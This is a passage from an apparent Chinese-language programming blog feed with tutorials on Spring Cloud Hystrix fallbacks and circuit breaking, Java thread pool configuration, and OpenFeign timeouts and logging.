title="3,配置服务降级:"></a>3,配置服务降级:</h4><h5 id="1-修改pay模块"><a href="#1-修改pay模块" class="headerlink" title="1,修改pay模块"></a>1,修改pay模块</h5><h6 id="1-为service的指定方法-会延迟的方法-添加-HystrixCommand注解"><a href="#1-为service的指定方法-会延迟的方法-添加-HystrixCommand注解" class="headerlink" title="1,为service的指定方法(会延迟的方法)添加@HystrixCommand注解"></a>1,为service的指定方法(会延迟的方法)添加@HystrixCommand注解</h6><p><img src="/img/springcloud2020/Hystrix的17.png" alt=""></p><h6 id="2-主启动类上-添加激活hystrix的注解"><a href="#2-主启动类上-添加激活hystrix的注解" class="headerlink" title="2,主启动类上,添加激活hystrix的注解"></a>2,主启动类上,添加激活hystrix的注解</h6><p><img src="/img/springcloud2020/Hystrix的18.png" alt=""></p><h6 id="3-触发异常"><a href="#3-触发异常" class="headerlink" title="3,触发异常"></a>3,触发异常</h6><p><img src="/img/springcloud2020/Hystrix的19.png" alt=""></p><p><img src="/img/springcloud2020/Hystrix的20.png" alt=""><strong>可以看到,也触发了降级</strong></p><h5 id="2-修改order模块-进行服务降级"><a href="#2-修改order模块-进行服务降级" class="headerlink" title="2,修改order模块,进行服务降级"></a>2,修改order模块,进行服务降级</h5><p>一般服务降级,都是放在客户端(order模块),</p><p><img src="/img/springcloud2020/Hystrix的21.png" alt=""></p><h6 id="1-修改配置文件"><a href="#1-修改配置文件" class="headerlink" title="1,修改配置文件:"></a>1,修改配置文件:</h6><p><img src="/img/springcloud2020/Hystrix的22.png" alt=""></p><h6 id="2-主启动类添加直接-启用hystrix"><a href="#2-主启动类添加直接-启用hystrix" class="headerlink" title="2,主启动类添加直接,启用hystrix:"></a><strong>2,主启动类添加直接,启用hystrix:</strong></h6><p><img src="/img/springcloud2020/Hystrix的23.png" alt=""></p><h6 id="3-修改controller-添加降级方法什么的"><a href="#3-修改controller-添加降级方法什么的" class="headerlink" title="3,修改controller,添加降级方法什么的"></a>3,修改controller,添加降级方法什么的</h6><p><img src="/img/springcloud2020/Hystrix的24.png" alt=""></p><h6 id="4-测试"><a href="#4-测试" class="headerlink" title="4,测试"></a>4,测试</h6><p>启动pay模块,order模块,</p><p><strong>注意:,这里pay模块和order模块都开启了服务降级</strong></p><p> 但是order这里,设置了1.5秒就降级,所以访问时,一定会降级</p><h5 id="4-重构"><a href="#4-重构" class="headerlink" title="4,重构:"></a>4,重构:</h5><p><strong>上面出现的问题:</strong><br>1,降级方法与业务方法写在了一块,耦合度高</p><p> 2.每个业务方法都写了一个降级方法,重复代码多</p><h5 id="解决重复代码的问题"><a href="#解决重复代码的问题" class="headerlink" title="解决重复代码的问题:"></a><strong>解决重复代码的问题</strong>:</h5><p><strong>配置一个全局的降级方法,所有方法都可以走这个降级方法,至于某些特殊创建,再单独创建方法</strong></p><h6 id="1-创建一个全局方法"><a href="#1-创建一个全局方法" class="headerlink" title="1,创建一个全局方法"></a>1,创建一个全局方法</h6><p><img src="/img/springcloud2020/Hystrix的26.png" alt=""></p><h6 id="2-使用注解指定其为全局降级方法-默认降级方法"><a href="#2-使用注解指定其为全局降级方法-默认降级方法" class="headerlink" title="2,使用注解指定其为全局降级方法(默认降级方法)"></a>2,使用注解指定其为全局降级方法(默认降级方法)</h6><p><img src="/img/springcloud2020/Hystrix的27.png" alt=""></p><p><img src="/img/springcloud2020/Hystrix的25.png" alt=""></p><h6 id="3-业务方法使用默认降级方法"><a href="#3-业务方法使用默认降级方法" class="headerlink" title="3,业务方法使用默认降级方法:"></a>3,业务方法使用默认降级方法:</h6><p><img src="/img/springcloud2020/Hystrix的28.png" alt=""></p><h6 id="4-测试-1"><a href="#4-测试-1" class="headerlink" title="4,测试:"></a>4,测试:</h6><p><img src="/img/springcloud2020/Hystrix的29.png" alt=""></p><h5 id="解决代码耦合度的问题"><a href="#解决代码耦合度的问题" class="headerlink" title="解决代码耦合度的问题:"></a>解决代码耦合度的问题:</h5><p>修改order模块,这里开始,pay模块就不服务降级了,服务降级写在order模块即可</p><h6 id="1-Payservice接口是远程调用pay模块的-我们这里创建一个类实现service接口-在实现类中统一处理异常"><a href="#1-Payservice接口是远程调用pay模块的-我们这里创建一个类实现service接口-在实现类中统一处理异常" class="headerlink" title="1,Payservice接口是远程调用pay模块的,我们这里创建一个类实现service接口,在实现类中统一处理异常"></a>1,Payservice接口是远程调用pay模块的,我们这里创建一个类实现service接口,在实现类中统一处理异常</h6><p><img src="/img/springcloud2020/Hystrix的30.png" alt=""></p><h6 id="2-修改配置文件-添加"><a href="#2-修改配置文件-添加" class="headerlink" title="2,修改配置文件:添加:"></a>2,修改配置文件:添加:</h6><p><img src="/img/springcloud2020/Hystrix的31.png" alt=""></p><h6 id="3-让PayService的实现类生效"><a href="#3-让PayService的实现类生效" class="headerlink" title="3,让PayService的实现类生效:"></a>3,让PayService的实现类生效:</h6><p><img src="/img/springcloud2020/Hystrix的32.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">它的运行逻辑是:</span><br><span class="line">        当请求过来,首先还是通过Feign远程调用pay模块对应的方法</span><br><span class="line">        但是如果pay模块报错,调用失败,那么就会调用PayMentFalbackService类的</span><br><span class="line">        当前同名的方法,作为降级方法</span><br></pre></td></tr></table></figure><h6 id="4-启动测试"><a href="#4-启动测试" class="headerlink" title="4,启动测试"></a>4,启动测试</h6><p>启动order和pay正常访问—ok</p><p>==此时将pay服务关闭,order再次访问==</p><p><img src="/img/springcloud2020/Hystrix的33.png" alt=""></p><p>可以看到,并没有报500错误,而是降级访问==实现类==的同名方法</p><p>这样,即使服务器挂了,用户要不要一直等待,或者报错</p><p>问题:</p><p>​        <strong>这样虽然解决了代码耦合度问题,但是又出现了过多重复代码的问题,每个方法都有一个降级方法</strong></p><h3 id="使用服务熔断"><a href="#使用服务熔断" class="headerlink" title="使用服务熔断:"></a>使用服务熔断:</h3><p><img src="/img/springcloud2020/Hystrix的34.png" alt=""></p><p><strong>比如并发达到1000,我们就拒绝其他用户访问,在有用户访问,就访问降级方法</strong></p><p><img src="/img/springcloud2020/Hystrix的35.png" alt=""></p><h4 id="1-修改前面的pay模块"><a href="#1-修改前面的pay模块" class="headerlink" title="1,修改前面的pay模块"></a>1,修改前面的pay模块</h4><h5 id="1-修改Payservice接口-添加服务熔断相关的方法"><a href="#1-修改Payservice接口-添加服务熔断相关的方法" class="headerlink" title="1,修改Payservice接口,添加服务熔断相关的方法:"></a><strong>1,修改Payservice接口,添加服务熔断相关的方法:</strong></h5><p><img src="/img/springcloud2020/Hystrix的37.png" alt=""></p><p>这里属性整体意思是:<br>10秒之内(窗口,会移动),如果并发==超过==10个,或者10个并发中,失败了6个,就开启熔断器</p><p><img src="/img/springcloud2020/Hystrix的43.png" alt="image-20200414152637247"></p><p>IdUtil是Hutool包下的类,这个Hutool就是整合了所有的常用方法,比如UUID,反射,IO流等工具方法什么的都整合了</p><p><img src="/img/springcloud2020/Hystrix的36.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">断路器的打开和关闭,是按照一下<span class="number">5</span>步决定的</span><br><span class="line">        <span class="number">1</span>,并发此时是否达到我们指定的阈值</span><br><span class="line">        <span class="number">2</span>,错误百分比,比如我们配置了<span class="number">60</span>%,那么如果并发请求中,<span class="number">10</span>次有<span class="number">6</span>次是失败的,就开启断路器</span><br><span class="line">        <span class="number">3</span>,上面的条件符合,断路器改变状态为open(开启)</span><br><span class="line">        <span class="number">4</span>,这个服务的断路器开启,所有请求无法访问</span><br><span class="line">        <span class="number">5</span>,在我们的时间窗口期,期间,尝试让一些请求通过(半开状态),如果请求还是失败,证明断路器还是开启状态,服务没有恢复</span><br><span class="line">        如果请求成功了,证明服务已经恢复,断路器状态变为close关闭状态</span><br></pre></td></tr></table></figure><h5 id="2-修改controller"><a href="#2-修改controller" class="headerlink" title="2,修改controller"></a>2,修改controller</h5><p>添加一个测试方法;</p><p><img src="/img/springcloud2020/Hystrix的39.png" alt=""></p><h5 id="3-测试"><a href="#3-测试" class="headerlink" title="3,测试:"></a>3,测试:</h5><p>启动pay,order模块</p><p>==多次访问,并且错误率超过60%:==</p><p><img src="/img/springcloud2020/Hystrix的40.png" alt=""></p><p>此时服务熔断,此时即使访问正确的也会报错:</p><p><img src="/img/springcloud2020/Hystrix的41.png" alt=""></p><p><strong>但是,当过了几秒后,又恢复了</strong></p><p> 因为在10秒窗口期内,它自己会尝试接收部分请求,发现服务可以正常调用,慢慢的当错误率低于60%,取消熔断</p><h3 id="Hystrix所有可配置的属性"><a href="#Hystrix所有可配置的属性" class="headerlink" title="Hystrix所有可配置的属性:"></a>Hystrix所有可配置的属性:</h3><p><strong>全部在这个方法中记录,以成员变量的形式记录,</strong></p><p> 以后需要什么属性,查看这个类即可</p><p><img src="/img/springcloud2020/Hystrix的38.png" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h3><p><img src="/img/springcloud2020/Hystrix的42.png" alt=""></p><p><strong>==当断路器开启后:==</strong></p><p>​    <img src="/img/springcloud2020/Hystrix的44.png" alt=""></p><p><strong>==其他参数:==</strong></p><p><img src="/img/springcloud2020/Hystrix的45.png" alt=""></p><p><img src="/img/springcloud2020/Hystrix的46.png" alt=""></p><p><img src="/img/springcloud2020/Hystrix的47.png" alt=""></p><p><img src="/img/springcloud2020/Hystrix的48.png" alt=""></p><p><img src="/img/springcloud2020/Hystrix的49.png" alt=""></p><p><strong>熔断整体流程:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>请求进来,首先查询缓存,如果缓存有,直接返回</span><br><span class="line">        如果缓存没有,---&gt;<span class="number">2</span></span><br><span class="line">        <span class="number">2</span>,查看断路器是否开启,如果开启的,Hystrix直接将请求转发到降级返回,然后返回</span><br><span class="line">        如果断路器是关闭的,</span><br><span class="line">        判断线程池等资源是否已经满了,如果已经满了</span><br><span class="line">        也会走降级方法</span><br><span class="line">        如果资源没有满,判断我们使用的什么类型的Hystrix,决定调用构造方法还是run方法</span><br><span class="line">        然后处理请求</span><br><span class="line">        然后Hystrix将本次请求的结果信息汇报给断路器,因为断路器此时可能是开启的</span><br><span class="line">        (因为断路器开启也是可以接收请求的)</span><br><span class="line">        断路器收到信息,判断是否符合开启或关闭断路器的条件,</span><br><span class="line">        如果本次请求处理失败,又会进入降级方法</span><br><span class="line">        如果处理成功,判断处理是否超时,如果超时了,也进入降级方法</span><br><span class="line">        最后,没有超时,则本次请求处理成功,将结果返回给controller</span><br></pre></td></tr></table></figure><h3 id="Hystrix服务监控"><a href="#Hystrix服务监控" class="headerlink" title="Hystrix服务监控:"></a>Hystrix服务监控:</h3><h4 id="HystrixDashboard"><a href="#HystrixDashboard" class="headerlink" title="HystrixDashboard"></a>HystrixDashboard</h4><p><img src="/img/springcloud2020/Hystrix的51.png" alt=""></p><h4 id="2-使用HystrixDashboard"><a href="#2-使用HystrixDashboard" class="headerlink" title="2,使用HystrixDashboard:"></a>2,使用HystrixDashboard:</h4><h5 id="1-创建项目"><a href="#1-创建项目" class="headerlink" title="1,创建项目:"></a>1,创建项目:</h5><p>名字: cloud_hystrixdashboard_9001</p><h5 id="2-pom文件-1"><a href="#2-pom文件-1" class="headerlink" title="2,pom文件"></a>2,pom文件</h5><h5 id="3-配置文件-2"><a href="#3-配置文件-2" class="headerlink" title="3,配置文件"></a>3,配置文件</h5><p><img src="/img/springcloud2020/Hystrix的52.png" alt=""></p><h5 id="4-主启动类-1"><a href="#4-主启动类-1" class="headerlink" title="4,主启动类"></a>4,主启动类</h5><p><img src="/img/springcloud2020/Hystrix的53.png" alt=""></p><h5 id="5-修改所有pay模块-8001-8002-8003…"><a href="#5-修改所有pay模块-8001-8002-8003…" class="headerlink" title="5,修改所有pay模块(8001,8002,8003…)"></a>5,修改所有pay模块(8001,8002,8003…)</h5><p><strong>他们都添加一个pom依赖:</strong></p><p><img src="/img/springcloud2020/Hystrix的54.png" alt=""></p><p>之前的pom文件中都添加过了,==这个是springboot的监控组件==</p><h5 id="6-启动9001即可"><a href="#6-启动9001即可" class="headerlink" title="6,启动9001即可"></a>6,启动9001即可</h5><p> 访问: <strong>localhost:9001/hystrix</strong></p><h5 id="7-注意-此时仅仅是可以访问HystrixDashboard-并不代表已经监控了8001-8002"><a href="#7-注意-此时仅仅是可以访问HystrixDashboard-并不代表已经监控了8001-8002" class="headerlink" title="7,注意,此时仅仅是可以访问HystrixDashboard,并不代表已经监控了8001,8002"></a>7,注意,此时仅仅是可以访问HystrixDashboard,并不代表已经监控了8001,8002</h5><p> 如果要监控,还需要配置:(8001为例)</p><p>==8001的主启动类添加:==</p><p><img src="/img/springcloud2020/Hystrix的55.png" alt=""></p><p><strong>其他8002,8003都是一样的</strong></p><h5 id="8-到此-可以启动服务"><a href="#8-到此-可以启动服务" class="headerlink" title="8,到此,可以启动服务"></a>8,到此,可以启动服务</h5><p>启动7001,8001,9001</p><p><strong>然后在web界面,指定9001要监控8001:</strong></p><h5 id=""><a href="#" class="headerlink" title=""></a><img src="/img/springcloud2020/Hystrix的56.png" alt=""></h5><p><img src="/img/springcloud2020/Hystrix的57.png" alt=""></p><p><img src="/img/springcloud2020/Hystrix的59.png" alt=""></p><p><img src="/img/springcloud2020/Hystrix的58.png" alt=""></p><p><img src="/img/springcloud2020/Hystrix的60.png" alt=""></p><p><img src="/img/springcloud2020/Hystrix的61.png" alt=""></p><p><img src="/img/springcloud2020/Hystrix的62.png" alt=""></p><h1 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h1>]]></content>
      
      
      <categories>
          
          <category> Hystrix </category>
          
          <category> 服务降级 </category>
          
          <category> spring cloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spring cloud </tag>
            
            <tag> Hystrix </tag>
            
            <tag> 服务降级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java线程池</title>
      <link href="/2021/05/30/java%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
      <url>/2021/05/30/java%E7%BA%BF%E7%A8%8B%E6%B1%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="Java线程池"><a href="#Java线程池" class="headerlink" title="Java线程池"></a>Java线程池</h2><h2 id="线程池的概念"><a href="#线程池的概念" class="headerlink" title="线程池的概念"></a>线程池的概念</h2><p>线程池就是首先创建一些线程，它们的集合称为线程池。使用线程池可以很好地提高性能，线程池在系统启动时即创建大量空闲的线程，程序将一个任务传给线程池，线程池就会启动一条线程来执行这个任务，执行结束以后，该线程并不会死亡，而是再次返回线程池中成为空闲状态，等待执行下一个任务。</p><h2 id="使用线程池的原因"><a href="#使用线程池的原因" class="headerlink" title="使用线程池的原因"></a>使用线程池的原因</h2><ul><li><p>降低资源消耗。通过重复利⽤已创建的线程降低线程创建和销毁造成的消耗。 </p></li><li><p>提⾼响应速度。当任务到达时，任务可以不需要的等到线程创建就能⽴即执⾏。</p></li><li><p>提⾼线程的可管理性。线程是稀缺资源，如果⽆限制的创建，不仅会消耗系统资源，还会降低系统的稳定性，使⽤线程池可以进⾏统⼀的分配，调优和监控。</p></li></ul><h2 id="线程池7大参数"><a href="#线程池7大参数" class="headerlink" title="线程池7大参数"></a>线程池7大参数</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ThreadPoolExecutor</span><span class="params">(<span class="keyword">int</span> corePoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">int</span> maximumPoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">long</span> keepAliveTime,</span></span></span><br><span class="line"><span class="function"><span class="params">                          TimeUnit unit,</span></span></span><br><span class="line"><span class="function"><span class="params">                          BlockingQueue&lt;Runnable&gt; workQueue,</span></span></span><br><span class="line"><span class="function"><span class="params">                          ThreadFactory threadFactory,</span></span></span><br><span class="line"><span class="function"><span class="params">                          RejectedExecutionHandler handler)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (corePoolSize &lt; <span class="number">0</span> ||</span><br><span class="line">        maximumPoolSize &lt;= <span class="number">0</span> ||</span><br><span class="line">        maximumPoolSize &lt; corePoolSize ||</span><br><span class="line">        keepAliveTime &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">    <span class="keyword">if</span> (workQueue == <span class="keyword">null</span> || threadFactory == <span class="keyword">null</span> || handler == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    <span class="keyword">this</span>.acc = System.getSecurityManager() == <span class="keyword">null</span> ?</span><br><span class="line">            <span class="keyword">null</span> :</span><br><span class="line">            AccessController.getContext();</span><br><span class="line">    <span class="keyword">this</span>.corePoolSize = corePoolSize;</span><br><span class="line">    <span class="keyword">this</span>.maximumPoolSize = maximumPoolSize;</span><br><span class="line">    <span class="keyword">this</span>.workQueue = workQueue;</span><br><span class="line">    <span class="keyword">this</span>.keepAliveTime = unit.toNanos(keepAliveTime);</span><br><span class="line">    <span class="keyword">this</span>.threadFactory = threadFactory;</span><br><span class="line">    <span class="keyword">this</span>.handler = handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>corePoolSize：核心线程数，核⼼线程数线程数定义了最⼩可以同时运⾏的线程数量。</p><p>maximumPoolSize：最大线程数， 当workQueue缓冲队列中存放的任务达到队列容量的时候，当前可以同时运⾏的线程数 量变为最⼤线程数。</p><p>keepAliveTime：非核心线程存活时间，当线程池中的线程数量⼤于 corePoolSize 的时候，如果这时没有新的任务提交，核⼼线程外的线程不会⽴即销毁，⽽是会等待，直到等待的时间超过了 keepAliveTime 才会被回收销毁。</p><p>unit: 时间单位，keepAliveTime 参数的时间单位。</p><p>workQueue：缓冲队列，当新任务来的时候会先判断当前运⾏的线程数量是否达到核⼼线程数，如果达 到的话，新任务就会被存放在队列中。</p><p>threadFactory：线程工厂，executor 创建新线程的时候会⽤到。</p><p>handler：拒绝策略，当线程池的任务缓存队列已满并且线程池中的线程数目达到maximumPoolSize，如果还有任务到来就会采取任务拒绝策略。</p><h3 id="几种缓冲队列"><a href="#几种缓冲队列" class="headerlink" title="几种缓冲队列"></a>几种缓冲队列</h3><p>workQueue的类型为BlockingQueue<Runnable>，通常可以取下面三种类型：</p><ul><li><p>ArrayBlockingQueue：基于数组的先进先出队列，此队列创建时必须指定大小；</p></li><li><p>LinkedBlockingQueue：基于链表的先进先出队列，如果创建时没有指定此队列大小，则默认为Integer.MAX_VALUE；</p></li><li><p>synchronousQueue：这个队列比较特殊，它不会保存提交的任务，而是将直接新建一个线程来执行新来的任务。</p></li></ul><h3 id="几种拒绝策略"><a href="#几种拒绝策略" class="headerlink" title="几种拒绝策略"></a>几种拒绝策略</h3><p>　　当线程池的任务缓存队列已满并且线程池中的线程数目达到maximumPoolSize，如果还有任务到来就会采取任务拒绝策略，通常有以下四种策略：</p><ul><li>ThreadPoolExecutor.AbortPolicy:丢弃任务并抛出RejectedExecutionException异常</li><li>ThreadPoolExecutor.DiscardPolicy：也是丢弃任务，但是不抛出异常。</li><li>ThreadPoolExecutor.DiscardOldestPolicy：丢弃队列最前面的任务，然后重新尝试执行任务（重复此过程）</li><li>ThreadPoolExecutor.CallerRunsPolicy：由调用线程处理该任务</li></ul><h2 id="jdk自带的三种线程池源码分析"><a href="#jdk自带的三种线程池源码分析" class="headerlink" title="jdk自带的三种线程池源码分析"></a>jdk自带的三种线程池源码分析</h2><h3 id="newCachedThreadPool"><a href="#newCachedThreadPool" class="headerlink" title="newCachedThreadPool"></a>newCachedThreadPool</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实例化</span></span><br><span class="line">ExecutorService newCachedExecutorService = Executors.newCachedThreadPool();</span><br><span class="line"></span><br><span class="line"><span class="comment">//源码</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newCachedThreadPool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> ThreadPoolExecutor(<span class="number">0</span>, Integer.MAX_VALUE,</span><br><span class="line">                                      <span class="number">60L</span>, TimeUnit.SECONDS,</span><br><span class="line">                                      <span class="keyword">new</span> SynchronousQueue&lt;Runnable&gt;());</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>corePoolSize核心线程数为0，创建的都是非核心线程，有多少任务创建多少个线程(最多创建Integer的最大值以内的非核心线程数2^31 - 1，任务执行较快的话线程复用除外，有CPU百分百占用风险)</p><p>synchronousQueue使用同步队列直接新建线程执行任务。</p><h3 id="newFixedThreadPool"><a href="#newFixedThreadPool" class="headerlink" title="newFixedThreadPool"></a>newFixedThreadPool</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实例化</span></span><br><span class="line">ExecutorService newFixedExecutorService = Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//源码</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newFixedThreadPool</span><span class="params">(<span class="keyword">int</span> nThreads)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ThreadPoolExecutor(nThreads, nThreads,</span><br><span class="line">                                      <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                                      <span class="keyword">new</span> LinkedBlockingQueue&lt;Runnable&gt;());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>corePoolSize核心线程数为实例化时传入参数，创建的都是核心线程，没有非核心线程。使用LinkedBlockingQueue：基于链表的先进先出队列，如果创建时没有指定此队列大小，则默认为Integer.MAX_VALUE；有OOM风险</p><h3 id="newSingleThreadExecutor"><a href="#newSingleThreadExecutor" class="headerlink" title="newSingleThreadExecutor"></a>newSingleThreadExecutor</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实例化</span></span><br><span class="line">ExecutorService newSingleExecutorService = Executors.newSingleThreadExecutor();</span><br><span class="line"></span><br><span class="line"><span class="comment">//源码</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newSingleThreadExecutor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> FinalizableDelegatedExecutorService</span><br><span class="line">            (<span class="keyword">new</span> ThreadPoolExecutor(<span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                                    <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                                    <span class="keyword">new</span> LinkedBlockingQueue&lt;Runnable&gt;()));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>corePoolSize核心线程数为1，只有一个核心线程。使用LinkedBlockingQueue：基于链表的先进先出队列，如果创建时没有指定此队列大小，则默认为Integer.MAX_VALUE；有OOM风险</p><h2 id="阿里编程手册上推荐的创建线程池的方式"><a href="#阿里编程手册上推荐的创建线程池的方式" class="headerlink" title="阿里编程手册上推荐的创建线程池的方式"></a>阿里编程手册上推荐的创建线程池的方式</h2><font color='red'> 注:由于Executors创建的线程池还多参数的设置都是什么Integer.MaxValue和无上限的BlockQuene等由此可能会导致CPU百分百占用（创建了无数个非核心线程）和OOM(缓冲队列溢出放不下)问题， 如果我们不加思考的使用，很容易把线程池用在错误的场景上， 因此阿里巴巴的编程手册上不推荐Executors创建线程池的方式， 它要求我们必须自己设置参数来创建线程池。</font><p>类似于上文中jdk自带的线程池实现，阿里编程手册推荐我们自己根据业务与实际自己调解参数调用ThreadPoolExecutor的构造方法实现线程池。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建数组型缓冲等待队列</span></span><br><span class="line"> BlockingQueue&lt;Runnable&gt; blockQueue = <span class="keyword">new</span> ArrayBlockingQueue&lt;Runnable&gt;(<span class="number">10</span>);</span><br><span class="line"> <span class="comment">// ThreadPoolExecutor:创建自定义线程池，池中保存的线程数为3，允许最大的线程数为6</span></span><br><span class="line"> ThreadPoolExecutor tpe = <span class="keyword">new</span> ThreadPoolExecutor(<span class="number">3</span>, <span class="number">6</span>, <span class="number">50</span>, TimeUnit.MILLISECONDS, blockQueue);</span><br></pre></td></tr></table></figure><h2 id="如何合理配置线程池的大小"><a href="#如何合理配置线程池的大小" class="headerlink" title="如何合理配置线程池的大小"></a>如何合理配置线程池的大小</h2><p>一般需要根据任务的类型来配置线程池大小：</p><p>如果是CPU密集型任务，就需要尽量压榨CPU，参考值可以设为 <em>N</em>CPU+1</p><p>如果是IO密集型任务，参考值可以设置为2<em>*N</em>CPU</p>]]></content>
      
      
      <categories>
          
          <category> java线程池 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java线程池 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenFeign服务调用</title>
      <link href="/2021/05/27/OpenFeign%E6%9C%8D%E5%8A%A1%E8%B0%83%E7%94%A8/"/>
      <url>/2021/05/27/OpenFeign%E6%9C%8D%E5%8A%A1%E8%B0%83%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="/img/springcloud2020/OpenFeign.png" alt=""></p><p><img src="/img/springcloud2020/OpenFeign1.png" alt=""></p><p>项目demo地址：<a href="https://github.com/raineddown/spring-cloud-demo" target="_blank" rel="noopener">https://github.com/raineddown/spring-cloud-demo</a></p><p>涉及服务:cloud-consumer-feign-order80、cloud-provider-payment8001、cloud-eureka-server7001</p><h2 id="Feign与OpenFeign区别"><a href="#Feign与OpenFeign区别" class="headerlink" title="Feign与OpenFeign区别"></a>Feign与OpenFeign区别</h2><p><img src="/img/springcloud2020/Feign的3.png" alt=""></p><h2 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h2><p>1.主启动类中</p><p><img src="/img/springcloud2020/Feign的5.png" alt=""></p><p>2.fegin需要调用的其他的服务的接口</p><p><img src="/img/springcloud2020/Feign的6.png" alt=""></p><p>3.controller</p><p><img src="/img/springcloud2020/Feign的7.png" alt=""></p><h2 id="OpenFeign超时机制"><a href="#OpenFeign超时机制" class="headerlink" title="OpenFeign超时机制:"></a>OpenFeign超时机制:</h2><p>==OpenFeign默认等待时间是1秒,超过1秒,直接报错==</p><h4 id="1-设置超时时间-修改配置文件"><a href="#1-设置超时时间-修改配置文件" class="headerlink" title="1,设置超时时间,修改配置文件:"></a>1,设置超时时间,修改配置文件:</h4><p><strong>因为OpenFeign的底层是ribbon进行负载均衡,所以它的超时时间是由ribbon控制</strong></p><p><img src="/img/springcloud2020/Feign的8.png" alt=""></p><h2 id="OpenFeign日志"><a href="#OpenFeign日志" class="headerlink" title="OpenFeign日志:"></a>OpenFeign日志:</h2><p><img src="/img/springcloud2020/Feign的9.png" alt=""></p><p>OpenFeign的日志级别有:</p><p><img src="/img/springcloud2020/Feign的10.png" alt=""></p><h4 id="1-使用OpenFeign的日志"><a href="#1-使用OpenFeign的日志" class="headerlink" title="1,使用OpenFeign的日志:"></a>1,使用OpenFeign的日志:</h4><p><strong>实现在配置类中添加OpenFeign的日志类</strong></p><p><img src="/img/springcloud2020/Feign的11.png" alt=""></p><h4 id="2-为指定类设置日志级别"><a href="#2-为指定类设置日志级别" class="headerlink" title="2,为指定类设置日志级别:"></a>2,为指定类设置日志级别:</h4><p><img src="/img/springcloud2020/Feign的13.png" alt=""></p><p><strong>配置文件中:</strong></p><p><img src="/img/springcloud2020/Feign的12.png" alt=""></p><h4 id="3-启动服务即可"><a href="#3-启动服务即可" 